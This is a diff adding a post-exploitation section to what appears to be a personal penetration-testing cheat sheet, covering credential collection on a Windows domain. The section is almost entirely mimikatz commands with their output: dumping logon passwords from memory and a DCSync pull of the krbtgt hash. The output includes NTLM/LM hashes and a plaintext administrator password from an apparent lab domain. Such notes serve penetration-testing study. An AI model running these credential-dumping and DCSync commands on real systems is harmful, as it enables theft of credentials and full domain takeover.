@@ -190,3 +190,113 @@ psexec
 
 	C:\Windows\system32>whoami
 	nt authority\system
+
+
+# Post-Exploitation
+
+## Credential Collection
+
+mimikatz (cmd needs to run administrators rights / locally)
+
+	PS C:\Users\thor\Desktop\mimikatz\x64> .\mimikatz.exe
+
+	  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilki
+	 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+	 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gm
+	  '#####'        > https://pingcastle.com / https://mysmartlogon
+
+	mimikatz # privilege::debug
+	Privilege '20' OK
+
+	mimikatz # sekurlsa::logonpasswords
+
+	Authentication Id : 0 ; 6433270 (00000000:006229f6)
+	Session           : Interactive from 1
+	User Name         : win7
+	Domain            : THOR
+	Logon Server      : THOR
+	Logon Time        : 13.08.2021 12:05:52
+	SID               : S-1-5-21-3401829504-2746700306-4210517594-10
+			msv :
+			 [00000003] Primary
+			 * Username : win7
+			 * Domain   : THOR
+			 * LM       : aad3b435b51404eeaad3b435b51404ee
+			 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
+			 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
+			tspkg :
+			 * Username : win7
+			 * Domain   : THOR
+			 * Password : (null)
+			wdigest :
+			 * Username : win7
+			 * Domain   : THOR
+			 * Password : (null)
+			kerberos :
+			 * Username : win7
+			 * Domain   : THOR
+			 * Password : (null)
+			ssp :
+			credman :
+
+	Authentication Id : 0 ; 5990364 (00000000:005b67dc)
+	Session           : CachedInteractive from 1
+	User Name         : Administrator
+	Domain            : VALHALLA
+	Logon Server      : ODIN
+	Logon Time        : 13.08.2021 11:47:21
+	SID               : S-1-5-21-3410397846-649609989-2919355437-500
+			msv :
+			 [00000003] Primary
+			 * Username : Administrator
+			 * Domain   : VALHALLA
+			 * LM       : 4fb7d301186e0eb3695109ab020e401c
+			 * NTLM     : c718f548c75062ada93250db208d3178
+			 * SHA1     : b27655136bebed1e53ded6cb9f837c450e7bb524
+			tspkg :
+			 * Username : Administrator
+			 * Domain   : VALHALLA
+			 * Password : Pass123!
+			wdigest :
+			 * Username : Administrator
+			 * Domain   : VALHALLA
+			 * Password : Pass123!
+			kerberos :
+			 * Username : Administrator
+			 * Domain   : VALHALLA.LOCAL
+			 * Password : Pass123!
+			ssp :
+			credman :
+			
+			
+mimikatz (dcsync / authuser should be admin rights)
+
+
+	mimikatz # lsadump::dcsync /domain:valhalla.local /user:krbtgt /authuser:administrator /authpassword:Pass123!
+	[DC] 'valhalla.local' will be the domain
+	[DC] 'odin.valhalla.local' will be the DC server
+	[DC] 'krbtgt' will be the user account
+	[rpc] Service  : ldap
+	[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+	[rpc] Username : administrator
+	[rpc] Domain   :
+	[rpc] Password : Pass123!
+
+	Object RDN           : krbtgt
+
+	** SAM ACCOUNT **
+
+	SAM Username         : krbtgt
+	Account Type         : 30000000 ( USER_OBJECT )
+	User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+	Account expiration   :
+	Password last change : 13.08.2021 07:22:10
+	Object Security ID   : S-1-5-21-3410397846-649609989-2919355437-502
+	Object Relative ID   : 502
+
+	Credentials:
+	  Hash NTLM: c2d3b9268608fab2b14a8c78c36316aa
+		ntlm- 0: c2d3b9268608fab2b14a8c78c36316aa
+		lm  - 0: 36fa5c99898f8a75a7783f250a6bf892
